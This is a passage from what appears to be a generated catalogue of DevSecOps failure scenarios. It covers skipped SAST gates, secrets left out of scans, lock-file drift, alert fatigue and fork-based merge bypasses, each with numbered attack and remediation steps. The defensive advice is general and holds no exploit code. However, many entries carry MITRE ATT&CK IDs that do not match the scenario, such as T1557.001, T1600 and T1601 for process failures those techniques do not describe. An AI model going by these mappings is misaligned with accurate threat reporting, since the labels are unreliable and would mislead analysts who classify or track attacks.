- **Vulnerability**: Report design hides critical alerts
- **MITRE**: T1190
- **Impact**: Missed CVE leads to production exploit
- **Tools**: GitLab CI, Snyk, HTML Report Viewer
- **Scenario**: Dev misreads SCA report, overlooks critical CVE because it was collapsed by default
- **Attack Steps**: 1. Snyk generates HTML reports in CI with collapsible sections for dependencies.2. A critical CVE in a transitive package is hidden under a collapsed section.3. Developer skims report and assumes no red flags.4. The report is archived and no action is taken.5. Vulnerability is exploited later, affecting payment gateway module.6. DevSecOps updates CI to include plaintext + email summary with CVEs listed upfront.7. Alerts are sorted by severity and sent as PR comments.8. CI pipeline displays fail banners if any high/critical CVEs are found.9. Reviewers are trained to open all report sections.10. A UX-focused redesign is done for security reports.
- **Detection**: CI report, CVE DB
- **Solution**: Plaintext summaries + alert banners
- **Tags**: #reportdesign #cvemissed #scavisibility

## Security Test Container Uses Old Base Image with Vulnerabilities

- **Attack Type**: Test Container Drift
- **Target**: CI Containers
- **Vulnerability**: Unpatched base image in scanner
- **MITRE**: T1601
- **Impact**: Privilege escalation via insecure scanner image
- **Tools**: Docker, Trivy, Jenkins
- **Scenario**: SAST scanner container uses outdated Ubuntu base with unpatched CVEs
- **Attack Steps**: 1. The pipeline uses a Docker container for running security tests (scanner-base:v1).2. This image uses ubuntu:18.04 which has multiple known CVEs.3. Although the scanner runs fine, it exposes the pipeline to risk if compromised.4. DevSecOps team assumes scanner container is safe since it's internal.5. Red Team compromises the container and runs privilege escalation tools via mounted volumes.6. Trivy is later introduced to scan all container images used in pipeline.7. DevSecOps sets up auto-update for scanner base images.8. Every CI job now includes trivy fs / as final step.9. CVE threshold alerting is enforced before deployment.10. Build team signs base images using Notary.
- **Detection**: Trivy scan output
- **Solution**: Automate CVE scan on all CI containers
- **Tags**: #dockerdrift #trivy #scacontainers

## Developer Ignores SAST Failures by Running Jobs Locally

- **Attack Type**: CI Evasion
- **Target**: Local Dev Env
- **Vulnerability**: Scan failure bypass by local runs
- **MITRE**: T1557.001
- **Impact**: Dangerous code pushed despite scan failure
- **Tools**: Local Docker, Git CLI, GitHub Actions
- **Scenario**: Dev bypasses failing CI jobs by running tests locally and pushing with override
- **Attack Steps**: 1. Developer runs SAST in local Docker container using docker run sast:latest ./src.2. Sees scan failures but proceeds anyway.3. Uses git push --no-verify to avoid pre-push hooks.4. CI system has a bug where it marks scan as passed if scan result is missing.5. Merge is completed; code goes live with unsafe SQL query.6. DevSecOps team identifies anomaly from CI job timing logs.7. CI is patched to fail if scan result is not uploaded.8. GitHub hooks are hardened to require artifact presence.9. Local scan results are compared against server reports to detect mismatches.10. Developers are reminded that local runs don’t substitute CI validations.
- **Detection**: CI artifact logs, push hooks
- **Solution**: Fail pipeline if scan output is missing
- **Tags**: #cievasion #localscan #devbypass

## Critical Secrets Exposed in PR But Pipeline Misses It Due to Custom Scan Config

- **Attack Type**: Secret Detection Gap
- **Target**: Public Code Repository
- **Vulnerability**: Misconfigured scan exclusions
- **MITRE**: T1552
- **Impact**: Credential compromise from missed scans
- **Tools**: GitHub Actions, TruffleHog, Regex Custom Rules
- **Scenario**: A developer accidentally commits a .env file with production secrets, but the pipeline’s custom SAST config excludes that file pattern
- **Attack Steps**: 1. A developer commits a .env.prod file containing AWS access keys, DB passwords, and SMTP credentials.2. The .env.prod file was supposed to be in .gitignore but was manually added for a hotfix.3. The CI pipeline uses TruffleHog for secret detection but is configured to only scan .js, .py, and .yml files to reduce scan time.4. As a result, the .env.prod file is excluded, and secrets go undetected.5. The PR gets merged and pushed to a public repo.6. Attackers monitoring the GitHub activity use GitHub dorks to detect this secret leak.7. Red Team simulates credential abuse and gains full access to AWS S3 buckets and EC2 instances.8. DevSecOps responds by modifying the scan rule to include all file extensions.9. Secret detection is also integrated into pre-commit hooks using GitLeaks.10. Secrets rotation policy is triggered using AWS Secrets Manager to revoke the leaked credentials.
- **Detection**: TruffleHog logs, GitHub secret scan alert
- **Solution**: Expand scan coverage + enforce pre-commit secrets detection
- **Tags**: #secretleak #scanconfig #gitexposure

## Pipeline Misconfiguration Allows Threat Modeling Step to be Skipped

- **Attack Type**: Pipeline Logic Flaw
- **Target**: API Deployment Pipelines
- **Vulnerability**: Optional threat model stage in CI
- **MITRE**: T1600
- **Impact**: SSRF and info exposure via unmodeled APIs
- **Tools**: GitLab CI, ThreatMapper, Custom YAML
- **Scenario**: Security gates such as threat modeling checks are wrapped in an optional pipeline step and can be skipped by users with permissions
- **Attack Steps**: 1. The DevSecOps team introduces a threat modeling stage using ThreatMapper before deploying new APIs.2. However, this stage is wrapped with a conditional when: manual clause in GitLab, making it optional.3. Developers unaware of its importance skip it to save time during feature rushes.4. As a result, new APIs expose internal service ports and internal IPs in logs.5. Red Team exploits these APIs to fingerprint internal microservices and initiate SSRF.6. The misconfiguration is discovered during a pipeline audit.7. DevSecOps enforces all security gates as mandatory by removing manual condition.8. Merge is blocked until threat modeling output is attached.9. Peer review process includes checking uploaded threat diagrams.10. Dashboards now show compliance rates for modeling stages.
- **Detection**: CI logs, SSRF detections, peer review
- **Solution**: Make threat modeling a mandatory gate
- **Tags**: #threatmodel #ssrf #cierrors

## Stale Findings in Feedback Loop Cause Developers to Ignore Real-Time Alerts

- **Attack Type**: Alert Fatigue
- **Target**: Developer CI Feedback
- **Vulnerability**: Reuse of stale security scan results
- **MITRE**: T1601
- **Impact**: Developers ignore new alerts due to noise
- **Tools**: Semgrep, GitHub Checks, Email Alerts
- **Scenario**: Developers receive outdated and irrelevant alerts due to non-purged SAST cache, leading to missed real bugs
- **Attack Steps**: 1. The CI/CD pipeline runs Semgrep and archives the results in a cache for performance.2. When developers open new PRs, the old cache is reused instead of rerunning a fresh scan.3. Alerts generated are outdated and sometimes already resolved.4. This causes developers to begin ignoring alerts altogether due to alert fatigue.5. A fresh vulnerability in JWT handling is introduced but missed.6. Attackers perform token replay and get unauthorized access to internal dashboards.7. DevSecOps updates the CI config to always re-run security scans regardless of cache presence.8. Old alerts are auto-dismissed once the commit they point to is no longer active.9. Developer training is held on recognizing critical vs stale alerts.10. Feedback is provided via inline PR comments, making it more contextual and relevant.
- **Detection**: GitHub scan cache, developer feedback
- **Solution**: Ensure every PR has fresh scan and filtered alert context
- **Tags**: #alertfatigue #jwtbug #feedbackloop

## Insecure Dependencies Go Unnoticed Due to Broken Dependency Tree in SCA Tool

- **Attack Type**: Dependency Graph Drift
- **Target**: NodeJS Project Repos
- **Vulnerability**: Lock file drift causes scan failure
- **MITRE**: T1190
- **Impact**: Production RCE from ignored dependencies
- **Tools**: Snyk, npm, GitHub Dependabot
- **Scenario**: SCA fails to trace transitive dependencies due to mismatched package-lock.json and package.json
- **Attack Steps**: 1. Developers update dependencies in package.json manually but forget to regenerate package-lock.json.2. The CI pipeline depends on the lock file for generating the dependency tree.3. As a result, Snyk scan is incomplete and doesn’t detect lodash@4.17.15, which has a known RCE bug.4. The vulnerable code reaches production unnoticed.5. Red Team exploits this using crafted prototype pollution payload.6. DevSecOps introduces a pre-CI validation step that fails if package.json and package-lock.json are out of sync.7. Auto-merge is disabled for dependency files unless both are updated.8. CI dashboards include "dependency drift" alerts.9. A nightly full dependency scan is added as redundancy.10. Devs are trained on how npm handles transitive resolution.
- **Detection**: Snyk scan reports, lock diff tools
- **Solution**: Lock file sync checks + nightly full scan
- **Tags**: #dependencydrift #rce #npmvuln

## Merge Allowed Without SAST Results Due to CI Job Naming Inconsistency

- **Attack Type**: CI Job Mismatch
- **Target**: GitHub CI Pipelines
- **Vulnerability**: Job name mismatch breaks enforcement
- **MITRE**: T1609
- **Impact**: SQLi vulnerability goes live due to skipped check
- **Tools**: GitHub Actions, CodeQL
- **Scenario**: The job responsible for uploading scan artifacts has a misspelled name, so GitHub ignores it for gating
- **Attack Steps**: 1. GitHub Actions requires a job named upload-sast-artifact to track SAST status.2. A developer renames it to sast-artifact-upload during refactoring.3. The PR gating system looks for exact job name; it sees no SAST output and assumes scan passed.4. A critical SQL injection remains unflagged.5. Red Team uses SQLMap to exfiltrate data from customer reports.6. DevSecOps patches PR gating logic to support wildcards or job ID references.7. Scan job IDs are centralized via shared workflow templates.8. GitHub branch protection rules now enforce artifact checks.9. Alerting is added for missing jobs.10. PR templates list required job names for reviewers.
- **Detection**: GitHub Actions logs
- **Solution**: CI workflow linting + consistent job naming
- **Tags**: #sastbypass #jobmismatch #ciintegrity

## Threat Modeling Skipped for Ephemeral Services Launched via Preview Environments

- **Attack Type**: Ephemeral Infra Gaps
- **Target**: Preview Deployments
- **Vulnerability**: Public exposure of unmodeled infra
- **MITRE**: T1078.001
- **Impact**: Exposed debug panels via public preview
- **Tools**: Vercel, Netlify, ThreatSpec
- **Scenario**: Preview deployments are considered low-risk, so no modeling or review occurs
- **Attack Steps**: 1. Developers deploy preview environments for every PR using Vercel.2. These environments are reachable via public subdomains.3. Threat modeling is not performed on these short-lived services.4. An attacker scans .vercel.app subdomains for misconfigured apps.5. One preview environment exposes internal admin panel in debug mode.6. Red Team exploits this to access internal tools.7. DevSecOps mandates that all preview deployments include automated security testing.8. Preview subdomains are now obfuscated and not indexed.9. Runtime access controls are added for ephemeral environments.10. Developers are required to add preview links to threat model docs.
- **Detection**: Domain scanning, preview logs
- **Solution**: Secure preview infra + model short-lived risks
- **Tags**: #vercel #ephemeralenv #threatmodelgap

## CodeQL Fails to Analyze Because of Build Config Drift in Mono Repo

- **Attack Type**: SAST Configuration Error
- **Target**: Monorepo Scanning
- **Vulnerability**: Multi-language CI build drift
- **MITRE**: T1557
- **Impact**: Critical code left unscanned in Go service
- **Tools**: GitHub Actions, CodeQL CLI
- **Scenario**: CodeQL build step fails silently due to incompatible build targets in multi-language monorepo
- **Attack Steps**: 1. Monorepo has NodeJS frontend and Go backend.2. CodeQL is configured to run after the build step.3. The Go build fails due to missing module, but the error is logged as a warning.4. CodeQL skips scanning the backend but does not fail the pipeline.5. A Go function accepting unsanitized user input remains unscanned.6. DevSecOps team discovers this post-exploitation.7. CI is modified to hard-fail on build issues.8. Logs are parsed using structured output for clearer alerts.9. Language-specific build steps are separated per folder.10. Scanning results now must include metadata on what was and wasn’t scanned.
- **Detection**: Build logs, scan coverage metadata
- **Solution**: Validate build + scan coverage rigorously
- **Tags**: #codeql #builddrift #monorepo

## Feedback Loop Misfires Due to Asynchronous PR Reviews on Security Alerts

- **Attack Type**: Delayed Feedback
- **Target**: Security PR Reviews
- **Vulnerability**: Asynchronous review delays
- **MITRE**: T1598
- **Impact**: Vulnerabilities remain unfixed for weeks
- **Tools**: GitHub, Jira, PagerDuty
- **Scenario**: Security findings are generated but reviewers are unavailable, causing long delays in fixes
- **Attack Steps**: 1. Semgrep generates high-priority alert in a PR.2. Assigned reviewer is on leave, so the PR remains stuck.3. Another dev merges unrelated PRs while the vulnerable code accumulates.4. A staging release contains XSS flaw.5. Red Team mimics exploitation by injecting scripts into feedback form.6. DevSecOps integrates PagerDuty rotation for PR reviews on security tags.7. Alerts now create Jira tickets with SLA based on severity.8. Escalations are handled through Discord + SMS alerts.9. Weekly dashboards track unreviewed security PRs.10. Backup reviewers are auto-assigned after 24h of inactivity.
- **Detection**: PR metadata, ticket backlog
- **Solution**: Escalate unreviewed security findings
- **Tags**: #feedbackdelay #reviewslas #xss

## Broken DevSecOps Policy Inheritance in Shared CI Templates

- **Attack Type**: Inheritance Failure
- **Target**: GitLab Repos
- **Vulnerability**: Security pipeline divergence
- **MITRE**: T1600
- **Impact**: Missed scans from template misalignment
- **Tools**: GitLab Templates, Reusable YAML
- **Scenario**: Centralized CI templates used across repos do not enforce updated security policies
- **Attack Steps**: 1. Security team updates central CI templates to include new SAST stages.2. Some teams override these templates without re-importing updates.3. The new sast_v2.yml never runs in those repos.4. A stored XSS flaw is missed in a legacy service.5. Attackers exploit this for cookie theft.6. GitLab pipeline audit reveals many repos out-of-date.7. DevSecOps creates dashboard to track template version per repo.8. All pipelines are locked to central template version with hash.9. Teams are notified of outdated pipelines weekly.10. New pipeline bootstrapping process includes security compliance check.
- **Detection**: Pipeline audit, template logs
- **Solution**: Version-lock critical CI templates
- **Tags**: #ciinheritance #gitlabtemplates #storedxss

## Developers Bypass Feedback by Merging via CLI Instead of UI

- **Attack Type**: UI Enforcement Bypass
- **Target**: GitHub Repos
- **Vulnerability**: CLI bypass of status checks
- **MITRE**: T1078
- **Impact**: Unvetted code merged via CLI
- **Tools**: Git CLI, GitHub Enterprise
- **Scenario**: Merge restrictions and feedback loops enforced only in GitHub UI can be bypassed via CLI
- **Attack Steps**: 1. GitHub Enterprise enforces status checks and required reviewers in the UI.2. However, some developers use Git CLI with elevated tokens to force-push merges.3. Status checks are not validated during CLI merges.4. A dangerous PR with broken auth logic is merged.5. The issue is caught in post-deploy monitoring, but only after it went live.6. DevSecOps disables CLI merge permissions except for release engineers.7. All merges must now happen via UI or protected automation.8. GitHub Webhooks alert on non-UI merges.9. PRs are force-blocked if bypassed merge is detected.10. Developers are re-onboarded with new secure merge policies.
- **Detection**: Git logs, webhook alerts
- **Solution**: Restrict merge methods to UI-only
- **Tags**: #clibypass #securemerge #gitpolicy

## Feedback Loop Broken Due to Unreachable Developer Emails in CI Notifications

- **Attack Type**: Communication Breakdown
- **Target**: Developer Feedback Loop
- **Vulnerability**: Stale developer contact channels
- **MITRE**: T1593
- **Impact**: Missed vulnerability due to silent communication failure
- **Tools**: GitHub Actions, SAST, SMTP Logs
- **Scenario**: Developers miss critical vulnerability alerts as outdated email addresses are used for notifications
- **Attack Steps**: 1. A critical hardcoded secret is detected in a new PR by GitHub Advanced Security.2. The security tool generates a CI event and attempts to email the assigned developer.3. However, the email in the developer’s profile is outdated or no longer valid.4. The email bounces back silently and the alert is not acknowledged.5. The PR gets merged due to automation, exposing the secret publicly.6. Red Team simulates misuse of the secret to pivot into AWS EC2 instances.7. DevSecOps adds webhook-based notifications to Slack/MS Teams as a parallel channel.8. Developers are required to verify and update emails quarterly.9. Alert delivery is confirmed via delivery logs and follow-ups.10. Security alerts are also mirrored in internal bug tracking tools (e.g., Jira).
- **Detection**: Email bounce logs, alert tracking
- **Solution**: Multi-channel notification redundancy
- **Tags**: #feedbackloop #alertdelivery #communicationgap

## Broken PR Review Enforcement Allows Security-Bypass via Forked Repo

- **Attack Type**: Fork Misuse
- **Target**: GitHub Forked Repositories
- **Vulnerability**: Bypass of branch protection via forks
- **MITRE**: T1600
- **Impact**: Code-level backdoor injection via forks
- **Tools**: GitHub Forks, GitHub Actions
- **Scenario**: Forked repositories bypass organization-level PR checks, skipping SAST and review rules
- **Attack Steps**: 1. A malicious contributor forks a repo and makes changes with backdoor logic.2. The organization uses GitHub branch protection rules only on main repo.3. When the fork is merged via command-line, SAST, DAST, and peer-review checks are not enforced.4. The backdoor code is merged into the main codebase silently.5. Red Team later demonstrates remote command execution through this backdoor.6. DevSecOps team configures required checks across forks using GitHub Apps and Actions workflows.7. Central SAST scans are applied using reusable workflows.8. Fork-based workflows are sandboxed in ephemeral runners.9. High-risk forks are audited weekly.10. Peer review is mandated regardless of origin.
- **Detection**: GitHub audit logs, repo webhook analysis
- **Solution**: Apply consistent policies across forks
- **Tags**: #forksecurity #prreviewbypass #devsecops

## Security Gate Skipped on Hotfix Branches Due to Partial Workflow Inheritance

- **Attack Type**: Incomplete Workflow Enforcement
- **Target**: GitHub CI/CD Workflows
- **Vulnerability**: Security gate missed in custom branches
- **MITRE**: T1609
- **Impact**: Misconfigured infra deployment via insecure hotfix
- **Tools**: GitHub Actions, Reusable Workflows
- **Scenario**: Developers create hotfix branches that skip security stages due to partial YAML reuse
- **Attack Steps**: 1. Security gates (SAST, IaC scanning) are defined in reusable workflows.2. A team creates a new hotfix branch and manually defines its workflow without importing the security stage.3. The new workflow omits critical scans but successfully passes CI.4. Vulnerable Terraform templates are merged containing overly permissive IAM policies.5. Red Team demonstrates full access to AWS environment using these permissions.6. DevSecOps establishes CI linting to flag workflows missing critical security jobs.7. Repos are mandated to use centrally maintained templates with enforced inheritance.8. Branch protection requires success from security-gate job.9. All hotfix branches are now gated with manual security approval.10. Workflows auto-reject PRs missing security checks.
- **Detection**: Lint reports, GitHub status checks
- **Solution**: Force secure YAML template reuse
- **Tags**: #workflowdrift #hotfixrisk #securitygates

## Threat Modeling Tool Fails Silently Due to Unsupported Architecture Diagrams

- **Attack Type**: Tool Limitation
- **Target**: Threat Modeling Stage
- **Vulnerability**: Diagram parsing compatibility gap
- **MITRE**: T1601
- **Impact**: Unmodeled attack surface via CI tooling gap
- **Tools**: ThreatSpec, MermaidJS, CI Integrator
- **Scenario**: Threat modeling tool crashes when parsing custom Mermaid diagrams, causing silent failure in CI
- **Attack Steps**: 1. Devs define their system diagrams using MermaidJS in markdown.2. Threat modeling tool integrates with CI and expects standard diagram syntax.3. When parsing custom class definitions or newer syntax, it fails silently.4. Threat modeling step shows success but no analysis is performed.5. Devs assume models are reviewed and merge PR.6. Exposed gRPC port remains undocumented, and is later exploited.7. CI logs are enhanced to capture modeling output artifacts.8. Modeling step now throws fatal errors on parsing issues.9. Diagrams are validated locally using CLI tool before commit.10. Tool is updated monthly to support latest syntax features.
- **Detection**: CI logs, modeling output diff
- **Solution**: Validate diagram compatibility before scan
- **Tags**: #mermaidjs #modelingerror #toolingblindspot

## Developers Ignore Feedback Due to Lack of Risk Scoring in Vulnerability Reports

- **Attack Type**: Developer Fatigue
- **Target**: Developer Feedback Process
- **Vulnerability**: Overwhelming raw security findings
- **MITRE**: T1203
- **Impact**: Critical bugs hidden under alert noise
- **Tools**: Snyk, Dependabot, Jira
- **Scenario**: Security scans return raw CVE lists without severity mapping, overwhelming devs with unprioritized alerts
- **Attack Steps**: 1. Snyk scan detects 80+ outdated libraries in a Java project.2. All findings are sent as-is to the developers via email and Jira tickets.3. Since no CVSS scores or risk-based grouping is done, developers are unsure what to fix first.4. Critical RCE in log4j-core is buried under non-critical outdated packages.5. Red Team exploits log4shell and gains shell access to backend server.6. DevSecOps enhances reporting by grouping findings based on exploitability and usage context.7. Tickets are tagged as "Critical", "Medium", or "Informational".8. Dashboards show aging reports with SLA timelines.9. Automated reminders are sent only for critical unresolved alerts.10. Feedback process is now developer-aware and risk-focused.
- **Detection**: SAST reports, Jira triage stats
- **Solution**: Prioritize and contextualize vulnerability alerts
- **Tags**: #cvss #riskprioritization #developerfatigue

## Feedback Loop Disrupted by Long Scan Times Causing CI Timeout Failures

- **Attack Type**: Scan Performance Bottleneck
- **Target**: IaC Scanning Stage
- **Vulnerability**: Long-running scan interruption
- **MITRE**: T1068
- **Impact**: Insecure infra committed due to scan skips
- **Tools**: Checkov, Semgrep, GitHub Actions
- **Scenario**: Security scans exceed CI runtime limits, resulting in failed builds and skipped alerts
- **Attack Steps**: 1. IaC scanning with Checkov takes ~25 mins due to large Terraform module base.2. GitHub Actions runner has 30-minute timeout; scans sometimes hang or abort.3. PRs fail intermittently, and some devs disable the scanning stage locally.4. Insecure SG rules and default allow-all buckets get merged.5. Red Team later shows S3 data exfiltration due to no restrictions.6. DevSecOps parallelizes scans by splitting modules across stages.7. Timeout limits are increased and redundant checks are pruned.8. Alert logs are cached and uploaded even on partial failure.9. Scan metrics are collected to identify long-running patterns.10. Slack alerts notify team of long builds needing attention.
- **Detection**: Build duration logs, timeout logs
- **Solution**: Optimize scanning granularity and parallelism
- **Tags**: #timeout #cioptimize #checkov

## Static Scanner Fails to Catch Custom Crypto Implementations

- **Attack Type**: SAST Blind Spot
- **Target**: Code Quality Stage
- **Vulnerability**: Weak custom crypto undetected by SAST
- **MITRE**: T1606
- **Impact**: Broken authentication due to crypto flaw
- **Tools**: Semgrep, Custom Rulepacks
- **Scenario**: Developers implement their own crypto logic; scanners can’t detect insecure patterns
- **Attack Steps**: 1. A dev builds a custom token generation using AES-ECB with static IV.2. Semgrep uses default rules that don’t flag this particular usage.3. The token is used for authentication and sent to clients.4. Attacker reverses the static encryption logic and creates valid tokens.5. Auth bypass is achieved.6. Red Team proves privilege escalation via token abuse.7. DevSecOps writes a custom rule for Semgrep to flag ECB usage and static IVs.8. Teams are discouraged from building crypto and told to use libs like libsodium.9. SAST rule coverage is periodically reviewed.10. Knowledge base includes do/don’t for crypto usage.
- **Detection**: Auth logs, SAST rule logs
- **Solution**: Ban custom crypto and extend scanner coverage
- **Tags**: #semgrep #crypto #authbypass

## Security Gate Bypassed by Temporary Disabling in Emergency Fixes

- **Attack Type**: Manual Override Risk
- **Target**: CI YAML Configs
- **Vulnerability**: Temporary disabling of security stages
- **MITRE**: T1070.006
- **Impact**: Infra exposure due to unverified emergency fix
- **Tools**: GitHub Actions, Manual Edit
- **Scenario**: Developers disable SAST or IaC scan in YAML to expedite a prod fix
- **Attack Steps**: 1. Developer faces a production outage caused by a broken Kubernetes YAML.2. To fix quickly, they comment out the iac-scan stage in CI YAML.3. The fix is committed and deployed without any security check.4. The new config accidentally enables public LoadBalancer for internal services.5. Red Team demonstrates inbound access to internal APIs.6. DevSecOps adds approval requirement for YAML changes.7. All .github/workflows/*.yml edits now trigger alert to security team.8. PR templates require justification for any scan disabling.9. CI enforces re-activation of disabled stages.10. Security gate changes are audited weekly.
- **Detection**: GitHub logs, YAML diffs
- **Solution**: Enforce controls on CI config edits
- **Tags**: #emergencyfix #securitygates #workflowedit

## Multiple Feedback Tools Cause Alert Duplication and Developer Confusion

- **Attack Type**: Alert Overlap
- **Target**: Developer Feedback Loop
- **Vulnerability**: Duplicate alerts from overlapping tools
- **MITRE**: T1592
- **Impact**: Developer burnout and incomplete fix coverage
- **Tools**: Snyk, CodeQL, Dependabot
- **Scenario**: Projects use Snyk, Dependabot, and CodeQL — alerts overlap and confuse developers
- **Attack Steps**: 1. Same vulnerability (e.g., vulnerable axios version) is flagged by 3 different tools.2. Developers receive 3 emails and 3 Jira tickets for the same issue.3. Fixes are committed without coordination, leading to merge conflicts.4. Developers disable at least one tool to reduce noise.5. Critical alerts from disabled tool go unnoticed later.6. DevSecOps consolidates alerts via centralized triage system.7. Duplicates are suppressed, and severity is unified.8. Only the highest severity tool is configured to notify.9. Triage dashboard shows alert origin + fix status.10. Tool policies are aligned to avoid overlap.
- **Detection**: Alert logs, ticket de-duplication stats
- **Solution**: Triage pipeline to suppress alert duplication
- **Tags**: #alertnoise #tooloverlap #triage

## Insecure Secrets in Environment Variables Detected Too Late Post-Merge

- **Attack Type**: Late Secret Exposure
- **Target**: CI Secret Management
- **Vulnerability**: Missing secret detection in env files
- **MITRE**: T1552
- **Impact**: Sensitive keys exposed post-deploy
- **Tools**: GitHub Actions, OWASP ZAP
- **Scenario**: Secrets are injected via .env files and not flagged until post-merge DAST
- **Attack Steps**: 1. Developers use .env files to inject credentials in Docker build.2. These are not scanned during SAST due to file exclusion.3. DAST test in staging detects secrets hardcoded in HTML debug outputs.4. Merge has already happened; hotfix needed.5. Red Team uses exposed SMTP creds to send spoofed internal emails.6. DevSecOps integrates .env scanning in pre-commit and pre-merge stages.7. Secret scanning tools like GitLeaks run in local dev and CI.8. Developers are trained to use Vaults (e.g., AWS Secrets Manager).9. Sensitive output is masked using CI logs scrubbers.10. .env and .secret files are blacklisted from repos.
- **Detection**: DAST staging results, SMTP traffic
- **Solution**: Enforce secret detection early in pipeline
- **Tags**: #envsecrets #gitleaks #cihygiene

